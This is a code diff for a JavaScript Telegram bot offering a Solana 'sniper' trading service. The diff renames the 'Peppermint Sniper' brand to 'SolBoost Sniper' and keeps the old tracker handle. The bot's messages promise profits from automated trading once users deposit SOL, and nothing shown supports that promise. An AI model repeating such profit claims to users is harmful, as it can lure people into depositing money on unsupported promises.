@@ -106,7 +106,7 @@ const loadMainMenu = async (ctx) => {
         [Markup.button.callback('Main wallet', 'main_wallet'), Markup.button.callback('Start earning', 'start_earning')],
         [Markup.button.callback('Track profits', 'track_profits'), Markup.button.callback('Withdraw', 'withdraw')],
         [Markup.button.callback('Referrals', 'referrals'), Markup.button.callback('Balance', 'balance')],
-        [Markup.button.callback('Track Peppermint Activity', 'track_peppermint')],
+        [Markup.button.callback('Track SolBoost Activity', 'track_SolBoost')],
         [Markup.button.callback('Refresh', 'refresh')]
     ]));
 };
@@ -206,7 +206,7 @@ bot.action('start_earning', async (ctx) => {
         if (solBalance < 0.02) {
             ctx.reply(`
 🚨 Alert: Your Wallet Balance is less than the balance required to start the trades.
-To activate the Peppermint Sniper bot and start earning profits with our automated trading system, please deposit at least 0.02 SOL into your trading wallet. Your current balance is ${solBalance.toFixed(2)} SOL
+To activate the SolBoost Sniper bot and start earning profits with our automated trading system, please deposit at least 0.02 SOL into your trading wallet. Your current balance is ${solBalance.toFixed(2)} SOL
             `);
         } else {
             const { blockhash } = await connection.getRecentBlockhash();
@@ -377,10 +377,10 @@ bot.action('balance', async (ctx) => {
     }
 });
 
-bot.action('track_peppermint', async (ctx) => {
+bot.action('track_SolBoost', async (ctx) => {
     try {
         await ctx.answerCbQuery();
-        ctx.reply(`Check out our Peppermint Sniper activity for reference and stay updated with our latest transactions and performance:\n\n@peppermintsnipertrack_bot.`);
+        ctx.reply(`Check out our SolBoost Sniper activity for reference and stay updated with our latest transactions and performance:\n\n@peppermintsnipertrack_bot.`);
     } catch (error) {
         if (error.code === 429) {
             await handleTelegramError(error, ctx.chat.id);
